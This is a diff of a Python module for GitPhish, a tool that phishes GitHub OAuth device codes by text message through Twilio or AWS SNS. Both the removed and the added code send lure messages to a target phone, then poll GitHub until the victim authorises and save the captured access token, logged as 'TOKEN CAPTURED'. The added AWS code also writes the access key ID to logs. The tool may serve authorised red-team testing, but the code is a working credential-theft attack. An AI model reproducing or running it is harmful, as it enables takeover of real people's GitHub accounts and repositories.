@@ -1,107 +1,94 @@
 """
-SMS Campaigns CLI for GitPhish - GitHub OAuth Device Code Phishing with SMS delivery.
+SMS delivery module for GitPhish campaigns.
 """
 
-import argparse
-import sys
-import time
-import json
-import urllib.parse
-import urllib3
-import os.path
 import logging
-import requests
-import datetime
-import concurrent.futures
-from twilio.rest import Client
-from cryptography.fernet import Fernet
-import base64
+import os
+import json
+import glob
 import boto3
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# GitHub OAuth Configuration
-GITHUB_CLIENT_ID = "178c6fc778ccc68e1d6a"
-GITHUB_DEVICE_CODE_URL = "https://github.com/login/device/code"
-GITHUB_TOKEN_URL = "https://github.com/login/oauth/access_token"
+from twilio.rest import Client
 
 def setup_sms_campaigns_subparser(parent_parser):
     """Setup SMS campaigns subparser."""
-    sms_parser = parent_parser.add_parser('sms', help='SMS Campaign Management')
-    sms_subparsers = sms_parser.add_subparsers(dest='sms_command', help='SMS campaign commands')
+    sms_parser = parent_parser.add_parser('sms', help='SMS delivery for phishing campaigns')
+    sms_subparsers = sms_parser.add_subparsers(dest='sms_command', help='SMS delivery providers')
     
-    # Twilio GitHub campaign
-    twilio_github = sms_subparsers.add_parser('twilio-github', help='GitHub OAuth via Twilio SMS')
-    twilio_github.add_argument('-e', '--email', required=True, help='Target email address')
-    twilio_github.add_argument('-p', '--phone', required=True, help='Target phone number')
-    twilio_github.add_argument('--sid', required=True, help='Twilio Account SID')
-    twilio_github.add_argument('--token', required=True, help='Twilio Auth Token')
-    twilio_github.add_argument('--from-phone', required=True, help='Twilio phone number')
-    twilio_github.add_argument('--scope', default='repo user', help='OAuth scopes')
-    twilio_github.add_argument('--message', help='Custom SMS message template')
-    twilio_github.add_argument('--debug', action='store_true', help='Enable debug logging')
-    twilio_github.set_defaults(func=run_twilio_github_campaign)
+    # Twilio SMS delivery
+    twilio_parser = sms_subparsers.add_parser('twilio', help='Send SMS via Twilio')
+    twilio_parser.add_argument('-e', '--email', required=True, help='Target email address')
+    twilio_parser.add_argument('-p', '--phone', required=True, help='Target phone number')
+    twilio_parser.add_argument('--sid', required=True, help='Twilio Account SID')
+    twilio_parser.add_argument('--token', required=True, help='Twilio Auth Token')
+    twilio_parser.add_argument('--from-phone', required=True, help='Twilio phone number')
+    twilio_parser.add_argument('--message', required=True, help='SMS message template')
+    twilio_parser.add_argument('--client-id', help='OAuth app client ID')
+    twilio_parser.add_argument('--org-name', help='Target organization name') 
+    twilio_parser.add_argument('--scope', default='repo user', help='OAuth scopes for token requests')
+    twilio_parser.add_argument('--debug', action='store_true', help='Enable debug logging')
+    twilio_parser.add_argument('--poll-tokens', action='store_true', help='Poll for OAuth token completion after sending SMS')
+    twilio_parser.set_defaults(func=send_twilio_campaign)
     
-    # AWS SNS GitHub campaign
-    aws_github = sms_subparsers.add_parser('aws-github', help='GitHub OAuth via AWS SNS')
-    aws_github.add_argument('-e', '--email', required=True, help='Target email address')
-    aws_github.add_argument('-p', '--phone', required=True, help='Target phone number')
-    aws_github.add_argument('--region', default='us-east-2', help='AWS region')
-    aws_github.add_argument('--scope', default='repo user', help='OAuth scopes')
-    aws_github.add_argument('--message', help='Custom SMS message template')
-    aws_github.add_argument('--debug', action='store_true', help='Enable debug logging')
-    aws_github.set_defaults(func=run_aws_github_campaign)
-    
-    # Set default for main sms parser
-    sms_parser.set_defaults(func=handle_sms_campaigns_command)
+    # AWS SNS SMS delivery
+    aws_parser = sms_subparsers.add_parser('aws', help='Send SMS via AWS SNS')
+    aws_parser.add_argument('-e', '--email', required=True, help='Target email address')
+    aws_parser.add_argument('-p', '--phone', required=True, help='Target phone number')
+    aws_parser.add_argument('--region', default='us-east-2', help='AWS region')
+    aws_parser.add_argument('--message', required=True, help='SMS message template')
+    aws_parser.add_argument('--client-id', help='OAuth app client ID')
+    aws_parser.add_argument('--org-name', help='Target organization name')
+    aws_parser.add_argument('--scope', default='repo user', help='OAuth scopes for token requests')
+    aws_parser.add_argument('--debug', action='store_true', help='Enable debug logging')
+    aws_parser.add_argument('--poll-tokens', action='store_true', help='Poll for OAuth token completion after sending SMS')
+    aws_parser.set_defaults(func=send_aws_campaign)
     
     return sms_parser
 
-def validate_encryption_key(encryption_key):
-    """Validate encryption key for secure token storage."""
-    try:
-        decoded_key = base64.urlsafe_b64decode(encryption_key)
-        if len(decoded_key) != 32:
-            raise ValueError("Encryption key must be 32 bytes after base64 decoding.")
-        return Fernet(encryption_key)
-    except Exception as e:
-        logging.error(f"Invalid encryption key: {e}")
-        sys.exit(1)
 
-class SMSTarget:
-    """Target for SMS campaign."""
-    def __init__(self, email, phone, encryption_key=None):
-        self.email = email
-        self.phone = phone
-        self.device_code = None
-        self.token_response = None
-        self.encryption_cipher = validate_encryption_key(encryption_key) if encryption_key else None
-        self.headers = {
-            "Accept": "application/json",
-            "User-Agent": "GitPhish SMS Campaign v0.2.0"
-        }
-
-def send_twilio_sms(target, message, sid, token, from_phone):
+def send_twilio_sms(phone, message, sid, token, from_phone, email=None):
     """Send SMS via Twilio."""
     try:
         client = Client(sid, token)
         client.messages.create(
-            to=target.phone, 
+            to=phone, 
             from_=from_phone, 
             body=message
         )
-        logging.info(f"[{target.email}] SMS sent successfully via Twilio")
+        logging.info(f"SMS sent successfully via Twilio to {phone}")
         return True
     except Exception as e:
-        logging.error(f"[{target.email}] Failed to send SMS via Twilio: {e}")
+        logging.error(f"Failed to send SMS via Twilio to {phone}: {e}")
         return False
 
-def send_aws_sms(target, message, region='us-east-2'):
+def send_aws_sms(phone, message, region='us-east-2', email=None):
     """Send SMS via AWS SNS."""
     try:
-        sns_client = boto3.client('sns', region_name=region)
+        # Try to use explicit credentials from environment first, then fall back to default
+        aws_access_key_id = os.getenv('AWS_ACCESS_KEY_ID')
+        aws_secret_access_key = os.getenv('AWS_SECRET_ACCESS_KEY')
+        aws_session_token = os.getenv('AWS_SESSION_TOKEN')
+        
+        if aws_access_key_id and aws_secret_access_key:
+            # Use explicit credentials passed via environment
+            logging.info(f"Using AWS credentials from environment variables")
+            logging.info(f"Access Key ID: {aws_access_key_id}")
+            logging.info(f"Secret Key: {'***' + aws_secret_access_key[-4:] if len(aws_secret_access_key) > 4 else '***'}")
+            logging.info(f"Session Token: {'Yes' if aws_session_token else 'No'}")
+            client_kwargs = {
+                'region_name': region,
+                'aws_access_key_id': aws_access_key_id,
+                'aws_secret_access_key': aws_secret_access_key
+            }
+            if aws_session_token:
+                client_kwargs['aws_session_token'] = aws_session_token
+            sns_client = boto3.client('sns', **client_kwargs)
+        else:
+            # Fall back to default credential chain
+            logging.info("Using AWS default credential chain")
+            sns_client = boto3.client('sns', region_name=region)
+            
         response = sns_client.publish(
-            PhoneNumber=target.phone,
+            PhoneNumber=phone,
             Message=message,
             MessageAttributes={
                 'AWS.SNS.SMS.SenderID': {
@@ -114,184 +101,179 @@ def send_aws_sms(target, message, region='us-east-2'):
                 }
             }
         )
-        logging.info(f"[{target.email}] SMS sent successfully via AWS SNS: {response['MessageId']}")
+        logging.info(f"SMS sent successfully via AWS SNS to {phone}: {response['MessageId']}")
         return True
     except Exception as e:
-        logging.error(f"[{target.email}] Failed to send SMS via AWS SNS: {e}")
+        logging.error(f"Failed to send SMS via AWS SNS to {phone}: {e}")
         return False
 
-def initiate_device_code_flow(target, scope='repo user', message_template=None):
-    """Initiate GitHub device code OAuth flow."""
-    target.headers['Content-Type'] = 'application/x-www-form-urlencoded'
-    
-    data = {
-        "client_id": GITHUB_CLIENT_ID,
-        "scope": scope
-    }
-    
-    try:
-        resp = requests.post(GITHUB_DEVICE_CODE_URL, headers=target.headers, data=data, verify=False)
-        if resp.status_code != 200:
-            logging.error(f'[{target.email}] GitHub device code request failed: {resp.json()}')
-            return None
-        
-        target.device_code = resp.json()
-        
-        # Generate SMS message
-        if message_template:
-            message = message_template.format(
-                email=target.email,
-                verification_uri=target.device_code['verification_uri'],
-                user_code=target.device_code['user_code'],
-                device_code=target.device_code['device_code']
-            )
-        else:
-            message = (
-                f"GitPhish Security Test - GitHub Device Verification\n\n"
-                f"Your GitHub device enrollment for {target.email} requires verification.\n\n"
-                f"Please visit: {target.device_code['verification_uri']}\n"
-                f"Enter code: {target.device_code['user_code']}\n\n"
-                f"This code expires in 15 minutes.\n\n"
-                f"[This is a security test - GitPhish v0.2.0]"
-            )
-        
-        return message
-    except Exception as e:
-        logging.error(f"[{target.email}] Device code flow failed: {e}")
-        return None
 
-def poll_for_token(target):
-    """Poll GitHub for OAuth token after user authorization."""
-    if not target.device_code:
-        return False
+def send_twilio_campaign(args):
+    """Send SMS via Twilio with optional OAuth integration."""
+    if args.debug:
+        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
     
-    url = GITHUB_TOKEN_URL
-    data = {
-        "client_id": GITHUB_CLIENT_ID,
-        "device_code": target.device_code["device_code"],
-        "grant_type": "urn:ietf:params:oauth:grant-type:device_code"
-    }
+    message = args.message
     
-    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=target.device_code["expires_in"])
-    
-    while datetime.datetime.now() < stop_time:
-        logging.info(f'[{target.email}] Polling for user authorization...')
-        
-        try:
-            resp = requests.post(url, headers=target.headers, data=data, verify=False)
-            response_data = resp.json()
-            
-            if "access_token" in response_data:
-                # Token received!
-                if target.encryption_cipher:
-                    encrypted_token = target.encryption_cipher.encrypt(response_data["access_token"].encode()).decode()
-                    target.token_response = {"access_token": encrypted_token, "encrypted": True}
-                else:
-                    target.token_response = {"access_token": response_data["access_token"], "encrypted": False}
-                
-                # Save token
-                filename = f'{target.email}.github_token.json'
-                with open(filename, 'w') as f:
-                    json.dump(target.token_response, f, indent=2)
-                
-                logging.info(f'[{target.email}] ✅ TOKEN CAPTURED! Saved to {filename}')
-                return True
-                
-            elif response_data.get("error") != "authorization_pending":
-                logging.error(f'[{target.email}] Authorization error: {response_data}')
-                return False
-            
-            # Wait before next poll
-            time.sleep(target.device_code.get("interval", 5))
-            
-        except Exception as e:
-            logging.error(f'[{target.email}] Polling error: {e}')
-            time.sleep(5)
-    
-    logging.warning(f'[{target.email}] ⏰ Device code expired without authorization')
-    return False
-
-def run_twilio_github_campaign(args):
-    """Run Twilio + GitHub OAuth campaign."""
-    logging.basicConfig(
-        level=logging.DEBUG if args.debug else logging.INFO,
-        format='%(asctime)s [%(levelname)s] %(message)s'
-    )
-    
-    logging.info("🚀 Starting Twilio + GitHub OAuth SMS Campaign")
-    
-    target = SMSTarget(args.email, args.phone)
-    
-    # Initiate device code flow
-    message = initiate_device_code_flow(target, args.scope, args.message)
-    if not message:
-        logging.error("Failed to initiate device code flow")
-        return 1
-    
-    # Send SMS
-    if not send_twilio_sms(target, message, args.sid, args.token, args.from_phone):
-        logging.error("Failed to send SMS")
-        return 1
-    
-    # Poll for token
-    success = poll_for_token(target)
-    
-    if success:
-        logging.info("🎯 Campaign completed successfully - Token captured!")
-        return 0
-    else:
-        logging.warning("📵 Campaign completed - No token captured")
-        return 1
-
-def run_aws_github_campaign(args):
-    """Run AWS SNS + GitHub OAuth campaign."""
-    logging.basicConfig(
-        level=logging.DEBUG if args.debug else logging.INFO,
-        format='%(asctime)s [%(levelname)s] %(message)s'
-    )
-    
-    logging.info("🚀 Starting AWS SNS + GitHub OAuth SMS Campaign")
-    
-    target = SMSTarget(args.email, args.phone)
-    
-    # Initiate device code flow
-    message = initiate_device_code_flow(target, args.scope, args.message)
-    if not message:
-        logging.error("Failed to initiate device code flow")
-        return 1
-    
-    # Send SMS
-    if not send_aws_sms(target, message, args.region):
-        logging.error("Failed to send SMS")
-        return 1
-    
-    # Poll for token
-    success = poll_for_token(target)
-    
-    if success:
-        logging.info("🎯 Campaign completed successfully - Token captured!")
-        return 0
-    else:
-        logging.warning("📵 Campaign completed - No token captured")
-        return 1
-
-def handle_sms_campaigns_command(args):
-    """Handle SMS campaigns command."""
-    if hasattr(args, 'sms_command') and args.sms_command:
-        if args.sms_command == 'twilio-github':
-            return run_twilio_github_campaign(args)
-        elif args.sms_command == 'aws-github':
-            return run_aws_github_campaign(args)
-        else:
-            print("❌ Unknown SMS campaign command")
+    # Check if OAuth integration is needed based on template variables
+    if '{verification_uri}' in message or '{user_code}' in message or '{email}' in message:
+        # Validate OAuth requirements
+        if not args.client_id or not args.org_name:
+            logging.error("❌ OAuth integration requires --client-id and --org-name arguments")
             return 1
-    else:
-        # No subcommand provided, show help
-        if hasattr(args, '_parser'):
-            args._parser.print_help()
-        else:
-            print("📱 GitPhish SMS Campaigns v0.2.0")
-            print("Available commands:")
-            print("  twilio-github  - GitHub OAuth via Twilio SMS")
-            print("  aws-github     - GitHub OAuth via AWS SNS")
-        return 0
+            
+        logging.info("🔐 OAuth integration detected in message template")
+        # Use existing manual OAuth flow and integrate with SMS
+        from gitphish.core.manual.manual import ManualDeviceAuth
+        
+        oauth_handler = ManualDeviceAuth()
+        try:
+            # Always skip wait for SMS - we need device codes immediately to send SMS
+            # The polling happens after SMS is sent if --poll-tokens is specified
+            device_flow = oauth_handler.run_manual_device_code_flow(
+                client_id=args.client_id,
+                org_name=args.org_name, 
+                email=args.email,
+                skip_wait=True  # Always skip wait to get device codes for SMS
+            )
+            
+            if isinstance(device_flow, dict) and 'user_code' in device_flow:
+                logging.info("📱 OAuth flow initiated - replacing template variables")
+                # Replace template variables with real values
+                message = message.replace('{email}', args.email or '')
+                message = message.replace('{user_code}', device_flow.get('user_code', ''))
+                message = message.replace('{verification_uri}', device_flow.get('verification_uri', 'https://github.com/login/device'))
+                message = message.replace('{device_code}', device_flow.get('device_code', ''))
+                
+                # Token will be saved automatically by ManualDeviceAuth when OAuth completes
+            else:
+                logging.error("❌ Failed to get device flow data")
+                
+        except Exception as e:
+            logging.error(f"❌ OAuth flow failed: {e}")
+            
+    # Send SMS with processed message
+    logging.info("📱 Sending SMS via Twilio")
+    success = send_twilio_sms(
+        phone=args.phone,
+        message=message, 
+        sid=args.sid, 
+        token=args.token, 
+        from_phone=args.from_phone,
+        email=args.email
+    )
+    
+    if not success:
+        logging.error("❌ Failed to send SMS")
+        return 1
+        
+    logging.info("✅ SMS sent successfully")
+    
+    # If poll_tokens is enabled, now poll for OAuth completion after SMS is sent
+    if getattr(args, 'poll_tokens', False) and '{verification_uri}' in args.message:
+        logging.info("🔄 Polling for OAuth token completion...")
+        try:
+            oauth_handler = ManualDeviceAuth()
+            
+            # Use the device_code from the OAuth flow we just ran
+            if isinstance(device_flow, dict) and 'device_code' in device_flow:
+                device_code = device_flow.get('device_code')
+                # Poll for completion
+                success = oauth_handler.poll_for_token_only(
+                    client_id=args.client_id,
+                    org_name=args.org_name,
+                    device_code=device_code,
+                    email=args.email
+                )
+                if success:
+                    logging.info("🎉 OAuth token completed!")
+                else:
+                    logging.info("⏰ OAuth token polling timed out - this is normal")
+        except Exception as e:
+            logging.error(f"Error during token polling: {e}")
+    
+    return 0
+
+def send_aws_campaign(args):
+    """Send SMS via AWS SNS with optional OAuth integration."""
+    if args.debug:
+        logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
+    
+    message = args.message
+    
+    # Check if OAuth integration is needed based on template variables
+    if '{verification_uri}' in message or '{user_code}' in message or '{email}' in message:
+        # Validate OAuth requirements
+        if not args.client_id or not args.org_name:
+            logging.error("❌ OAuth integration requires --client-id and --org-name arguments")
+            return 1
+            
+        logging.info("🔐 OAuth integration detected in message template")
+        # Use existing manual OAuth flow and integrate with SMS
+        from gitphish.core.manual.manual import ManualDeviceAuth
+        
+        oauth_handler = ManualDeviceAuth()
+        try:
+            # Always skip wait for SMS - we need device codes immediately to send SMS
+            # The polling happens after SMS is sent if --poll-tokens is specified
+            device_flow = oauth_handler.run_manual_device_code_flow(
+                client_id=args.client_id,
+                org_name=args.org_name,
+                email=args.email, 
+                skip_wait=True  # Always skip wait to get device codes for SMS
+            )
+            
+            if isinstance(device_flow, dict) and 'user_code' in device_flow:
+                logging.info("📱 OAuth flow initiated - replacing template variables")
+                # Replace template variables with real values
+                message = message.replace('{email}', args.email or '')
+                message = message.replace('{user_code}', device_flow.get('user_code', ''))
+                message = message.replace('{verification_uri}', device_flow.get('verification_uri', 'https://github.com/login/device'))
+                message = message.replace('{device_code}', device_flow.get('device_code', ''))
+                
+                # Token will be saved automatically by ManualDeviceAuth when OAuth completes
+            else:
+                logging.error("❌ Failed to get device flow data")
+                
+        except Exception as e:
+            logging.error(f"❌ OAuth flow failed: {e}")
+            
+    # Send SMS with processed message
+    logging.info("📱 Sending SMS via AWS SNS")
+    success = send_aws_sms(
+        phone=args.phone,
+        message=message, 
+        region=args.region,
+        email=args.email
+    )
+    
+    if not success:
+        logging.error("❌ Failed to send SMS")
+        return 1
+        
+    logging.info("✅ SMS sent successfully")
+    
+    # If poll_tokens is enabled, now poll for OAuth completion after SMS is sent
+    if getattr(args, 'poll_tokens', False) and '{verification_uri}' in args.message:
+        logging.info("🔄 Polling for OAuth token completion...")
+        try:
+            oauth_handler = ManualDeviceAuth()
+            
+            # Use the device_code from the OAuth flow we just ran
+            if isinstance(device_flow, dict) and 'device_code' in device_flow:
+                device_code = device_flow.get('device_code')
+                # Poll for completion
+                success = oauth_handler.poll_for_token_only(
+                    client_id=args.client_id,
+                    org_name=args.org_name,
+                    device_code=device_code,
+                    email=args.email
+                )
+                if success:
+                    logging.info("🎉 OAuth token completed!")
+                else:
+                    logging.info("⏰ OAuth token polling timed out - this is normal")
+        except Exception as e:
+            logging.error(f"Error during token polling: {e}")
+    
+    return 0
